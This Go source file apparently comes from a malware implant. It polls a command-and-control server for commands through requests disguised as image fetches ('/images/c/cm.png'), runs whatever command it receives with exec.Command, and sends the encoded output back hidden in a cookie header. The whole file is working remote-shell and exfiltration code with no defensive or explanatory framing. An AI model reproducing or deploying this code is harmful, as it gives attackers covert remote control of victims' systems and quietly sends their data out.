package utils

import (
	"io"
	"net/http"
	"os/exec"
	"strings"
)

func ExecC2Shell(debug bool, server string, guid string) error {
	var url string = server + "/images/c/cm.png"
	PrintDebug(debug, "Asking for command to %s", url)
	client := &http.Client{}
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("cookie", guid+"=")
	res, err := client.Do(req)
	if err != nil {
		PrintDebug(debug, "Error getting commands from %s\n%v", url, err)
		return err
	}
	defer res.Body.Close()
	body, err := io.ReadAll(res.Body)
	err = ExecuteAndRespond(debug, server, guid, body)
	return err
}

func ExecuteAndRespond(debug bool, server string, guid string, body []byte) error {
	var (
		url = server + "/images/c/cr.png"
		err error
	)
	PrintDebug(debug, "Executing command: %s", strings.Replace(string(body), ":", " ", -1))
	commands := strings.Split(string(body), ":")
	cmd := exec.Command(commands[0], commands[1:]...)
	if err != nil {
		PrintDebug(debug, "Error executing command %v", err)
		return err
	}
	output, _ := cmd.CombinedOutput()
	PrintDebug(debug, "_ "+string(output))

	// upload this to the server
	data, _ := EncodeString(debug, string(output))
	PrintDebug(debug, "Uploading output to %s", url)
	client := &http.Client{}
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("cookie", guid+"="+data)
	_, err = client.Do(req)
	return err
}
